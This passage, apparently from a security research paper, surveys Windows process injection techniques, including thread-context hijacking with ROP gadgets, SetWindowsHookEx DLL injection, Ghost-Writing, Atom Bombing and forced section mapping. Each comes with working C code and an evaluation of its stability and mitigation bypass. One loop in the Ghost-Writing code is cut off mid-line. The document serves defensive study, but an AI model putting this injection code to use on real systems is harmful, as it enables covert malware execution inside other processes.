enough space *below* the entry point for stack used by system calls, etc. 
SetThreadContext(t, &ctx); 
ResumeThread(t); 
Code for non-executable memory (ROP-chain), with cleanup: 
void wait_until_done(HANDLE t, DWORD64 expected_rip_value) 
{ 
CONTEXT x; 
do 
{ 
Sleep(10); 
SuspendThread(t); 
x.ContextFlags = CONTEXT_CONTROL; 
GetThreadContext(t, &x); 
ResumeThread(t); 
} while (x.Rip != expected_rip_value); 
} 
DWORD64 GADGET_loop; // jmp -2 
DWORD64 GADGET_pivot; // pop rsp; ret 
HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id); 
// Save the thread's state 
SuspendThread(t); 
CONTEXT old_ctx; 
old_ctx.ContextFlags = CONTEXT_ALL; 
GetThreadContext(t, &old_ctx); 
// Hijack thread 
CONTEXT new_ctx = old_ctx; 
new_ctx.Rip = GADGET_pivot; 
new_ctx.Rsp -= 8; 
WriteProcessMemory(p, (LPVOID)new_ctx.Rsp, &new_stack_address, 8, NULL); 
SetThreadContext(t, &new_ctx); 
ResumeThread(t); 
wait_until_done(t, GADGET_loop); 
// Resume execution of original thread logic 
SuspendThread(t); 
SetThreadContext(t, &old_ctx); 
ResumeThread(t); 
6. Windows Hook write primitive + execution method (prehistoric) 
a. Write a malicious DLL to disk, DllMain (or hook routine) should contain a bootstrap code 
(payload) 
b. Call SetWindowsHookEx(…,handle to DLL, thread_id) – this will load the DLL into the 
process (thread_id must be a message loop). A less elegant version: set thread_id=0, will 
inject to all processes with message loop.  
Code: 
HMODULE h = LoadLibraryA(dll_path); 
HOOKPROC f = (HOOKPROC)GetProcAddress(h, "GetMsgProc"); // GetMessage hook 
SetWindowsHookExA(WH_GETMESSAGE, f, h, thread_id); 
PostThreadMessage(thread_id, WM_NULL, NULL, NULL); // trigger the hook 
Evaluation: 
o Prerequisites: malicious DLL written to disk, target process must have user32.dll loaded 
(and a message loop thread) 
o Limitations: none 
o CFG/CIG-readiness: CIG prevents loading on non-Microsoft signed DLL. An attempt to do 
so results in error 0xC0000428 (STATUS_INVALID_IMAGE_HASH – “The hash for image 
%hs cannot be found in the system catalogs. The image is likely corrupt or the victim of 
tampering.” - https://msdn.microsoft.com/en-us/library/cc704588.aspx)  
o Control over registers: none (but typically not a problem due to linking) 
o Controlled vs. uncontrolled write address: N/A 
o Stability: good 
o Cleanup required: no 
7. SetWinEventHook write primitive + execution method (prehistoric) 
The idea is to set up a global (or per-process) in-context hook using SetWinEventHook. 
Theoretically, this forces the target process to load the specified DLL and invoke the specified 
hook function for the specified range of Windows events. However, in our tests (with Windows 
10 version 1903), we could not force the DLL to load at the target process, and all events were 
handled in out-of-context fashion. The documentation (https://docs.microsoft.com/en-
us/windows/desktop/api/Winuser/nf-winuser-setwineventhook) does mention that “in some 
situations, even if you request WINEVENT_INCONTEXT events, the events will still be delivered 
out-of-context“, so perhaps Microsoft moved all events to our-of-context mode in recent 
Windows versions. 
Bottom line: doesn’t work with recent Windows 10 versions. 
8. Ghost-Writing write primitive + execution method (2007) 
Invented by “txipi” (http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-
process-without-openning-it-nor-actually-writing-to-it/) 
a. Use a series of SetThreadContext calls to manipulate memory (using a simple gadget 
that writes one register to the address in another register), and then use that as a ROP 
chain.  
b. Final step of ROP chain should be restoring the volatile registers. 
Code: 
void wait_until_done(HANDLE t, DWORD64 expected_rip_value) 
{ 
CONTEXT x; 
do 
{ 
Sleep(10); 
SuspendThread(t); 
x.ContextFlags = CONTEXT_CONTROL; 
GetThreadContext(t, &x); 
ResumeThread(t); 
}  
while (x.Rip != expected_rip_value); 
} 
DWORD64 GADGET_loop; // jmp -2 
DWORD64 GADGET_write; // mov [rdi],rbx; mov rbx, [rsp+0x60]; add rsp,0x50; pop 
rdi; ret --- this is WRITE rbx at address rdi (and advance Rsp by 0x58…); note that in 
Windows 10 version 1903, the gadget is changed to mov [rdi],rbx; mov rbx, [rsp+0x70]; 
add rsp,0x60; pop rdi; ret 
HANDLE t = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, thread_id); 
// Save target thread original state 
SuspendThread(t); 
CONTEXT old_ctx; 
old_ctx.ContextFlags = CONTEXT_ALL; 
GetThreadContext(t, &old_ctx); 
// Prepare new stack in ROP_chain 
DWORD64 new_stack_pos = ((old_ctx.Rsp - (sizeof(ROP_chain)+0x60) +8) & 
0xFFFFFFFFFFFFFFF0) - 8 ; // make sure stack is 16-byte aligned before the return 
address. Use 0x70 in version 1903. 
// Write address of GADGET_loop to the target thread stack (used as part of the 
Write Primitive) 
CONTEXT new_ctx = old_ctx; 
new_ctx.Rsp -= 8+0x58; // use 0x68 in version 1903 
new_ctx.Rbx = GADGET_loop; 
new_ctx.Rdi = new_ctx.Rsp+0x58;  // use 0x68 in version 1903 
new_ctx.Rip = GADGET_write; 
SetThreadContext(t, &new_ctx); 
ResumeThread(t); 
wait_until_done(t, GADGET_loop); 
// Write new stack to target process memory space 
for (int i = 0; i 0 and using SetWindowsLongPtr 
to write there) results in the data appearing in the memory space of the target process 
(allegedly in fixed offset w.r.t. the Desktop Heap memory region base address). Finding the 
Desktop Heap in the target process is allegedly a matter of finding a memory region (using 
VirtualQueryEx) satisfying some conditions. EnSilo provides a PoC at 
https://github.com/BreakingMalware/PowerLoaderEx/blob/master/PowerLoaderEx.cpp. It 
seems that with Windows 10 64-bit (at least in build 1809), changes were made to the Desktop 
Heap implementation. Apparently, A process’s user space memory no longer contains the 
objects from other processes, thus rendering the technique ineffective. 
Bottom line: doesn’t work on Windows 10 (at least on build 1809) 
12. Atom bombing write primitive (2016) 
Invented by Tal Liberman, Ensilo (https://blog.ensilo.com/atombombing-brand-new-code-
injection-for-windows).  
a. Split the payload into NUL-terminated strings 
b. Create an Atom for each one (GlobalAddAtom). Note: Atom cannot represent a 0-length 
string 
c. Copy the strings to the target process memory using NtQueueApcThread(thread, 
GlobalGetAtomName, atom,target_address,size).  
Our code handles the problem of consecutive NUL bytes by creating the sequence backwards 
using an auxiliary atom of a single arbitrary non-NUL byte. Note that NUL bytes are created first, 
and only then the non-NUL bytes are added. 
If the payload starts with a NUL byte, it is still possible to write it by artificially prepending it with 
at least one non-NUL byte (not shown in the code) 
NOTE: the original atom bombing PoC did not directly address the issue of consecutive NUL 
bytes. Instead, it assumed that the target memory is 0-filled (which is indeed the case for the 
.data slack used by the original PoC).   
The code below ignores the issue of maximum atom length (RTL_MAXIMUM_ATOM_LENGTH – 
probably 255). Longer payloads need to be broken into chunks of up to 255 bytes. 
Code: 
HANDLE th = OpenThread(THREAD_SET_CONTEXT| THREAD_QUERY_INFORMATION, FALSE, 
thread_id); 
ATOM aux = GlobalAddAtomA("b"); // arbitrary one char string 
if (target_payload[0] == '\0') 
{ 
printf("Invalid payload (starts with NUL)\n"); 
exit(0); 
} 
for (DWORD64 pos = sizeof(target_payload) - 1; pos > 0; pos--) 
{ 
if ((payload[pos] == '\0') && (payload[pos - 1] == '\0')) 
{ 
ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)aux, 
(PVOID)(((DWORD64)target_payload) + pos-1), (PVOID)2); 
} 
} 
for (char* pos = payload; pos < (payload + sizeof(payload)); pos += strlen(pos)+1) 
{ 
if (*pos == '\0') 
{ 
continue; 
} 
ATOM a = GlobalAddAtomA(pos); 
DWORD64 offset = pos - payload; 
ntdll!NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)a, 
(PVOID)(((DWORD64)target_payload) + offset), (PVOID)(strlen(pos)+1)); 
} 
Evaluation: 
o Prerequisites: process must have a thread in alertable state 
o Limitations: none 
o CFG/CIG-readiness: not affected 
o Controlled vs. uncontrolled write address: address is fully controlled 
o Stability: good 
13. Forcibly map a section (NtMapViewOfSection) write primitive (2017) 
Encountered in the wild (Zberp - https://securityintelligence.com/diving-into-zberps-
unconventional-process-injection-technique/), though used (slightly differently) for process 
hollowing earlier.  
a. Create a file mapping using CreateFileMapping, mapped to the system pagefile.  
b. MapViewOfFile to map it to injector process memory 
c. Copy data to the section’s mapped memory 
d. NtMapViewOfSection to the target process (automatically allocates memory in the 
target process if base_address==NULL) 
Code: 
HANDLE fm = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 
0, sizeof(payload), NULL); 
LPVOID map_addr =MapViewOfFile(fm, FILE_MAP_ALL_ACCESS, 0, 0, 0); 
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, 
process_id); 
memcpy(map_addr, payload, sizeof(payload));  
LPVOID requested_target_payload=0; 
SIZE_T view_size=0; 
ntdll!NtMapViewOfSection(fm, p, &requested_target_payload, 0, sizeof(payload), 
NULL, &view_size, ViewUnmap, 0, PAGE_EXECUTE_READWRITE ); 
target_payload=requested_target_payload; 
Evaluation: 
o Prerequisites: none 
o Limitations: cannot write to allocated memory 
o CFG/CIG-readiness: not affected 
o Controlled vs. uncontrolled write address: address is fully controlled, but cannot be used 
to write to an allocated memory. So it’s better to let Windows choose the address. 
o Stability: good 
14. Unmap+Overwrite  execution method (2017) 
Encountered in the wild (Zberp - https://securityintelligence.com/diving-into-zberps-
unconventional-process-injection-technique/), though used (slightly differently) for process 
hollowing earlier.  
a. NtUnmapViewOfSection for ntdll in the target process 
b. Use any write primitive to allocate and write your own ntdll in its original address in the 